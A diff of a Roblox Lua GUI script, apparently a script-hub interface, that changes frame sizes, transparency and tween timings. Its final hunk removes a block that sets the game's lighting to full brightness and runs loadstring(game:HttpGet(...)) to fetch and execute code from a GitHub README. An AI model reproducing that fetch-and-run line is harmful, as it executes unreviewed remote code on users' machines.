@@ -88,7 +88,7 @@ YOUHUB["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.js
 YOUHUB["11"]["TextSize"] = 30;
 YOUHUB["11"]["TextColor3"] = Color3.fromRGB(114, 114, 114);
 YOUHUB["11"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
-YOUHUB["11"]["Size"] = UDim2.new(0, 200, 0, 50);
+YOUHUB["11"]["Size"] = UDim2.new(0, 2100, 0, 50);
 YOUHUB["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 YOUHUB["11"]["Text"] = [[----]];
 YOUHUB["11"]["Name"] = [[PercentAmount]];
@@ -110,11 +110,11 @@ local script = OsirisHub["5"];
 end;
 task.spawn(C_5);
 local function C_8()
-local script = YOUHUB["8"];
+local script = YOUHUB["9"];
 	local BeginingSize = UDim2.new(9, 5, 9, 5)
-	local MainSize = UDim2.new(0, 1000, 0, 750)
-	local SpreadSize = UDim2.new(0, 400, 0, 5)
-	script.Parent.BackgroundTransparency = 1
+	local MainSize = UDim2.new(0, 1200, 0, 630)
+	local SpreadSize = UDim2.new(0, 1400, 0, 5)
+	script.Parent.BackgroundTransparency = 0
 	script.Parent.Size = BeginingSize
 	for i = 0, 10 do
 		script.Parent.BackgroundTransparency -= 0.1
@@ -123,7 +123,7 @@ local script = YOUHUB["8"];
 		SpreadSize,
 		Enum.EasingDirection.InOut,
 		Enum.EasingStyle.Linear,
-		0.5,
+		1,
 		true
 	)
 	wait(1.25)
@@ -131,7 +131,7 @@ local script = YOUHUB["8"];
 		MainSize, 
 		Enum.EasingDirection.InOut,
 		Enum.EasingStyle.Linear, 
-		0.5, 
+		1, 
 		true
 	)
 end;
@@ -186,9 +186,4 @@ local script = YOUHUB["12"];
 	end
 end;
 task.spawn(C_12);
-return YOUHUB["1"], require > 
-wait(45)
-game:GetService("Lighting")
-game.Lighting.GlobalShadows = false
-game.Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CQWEO/Y/main/README.md"))()
+return YOUHUB["1"], require;
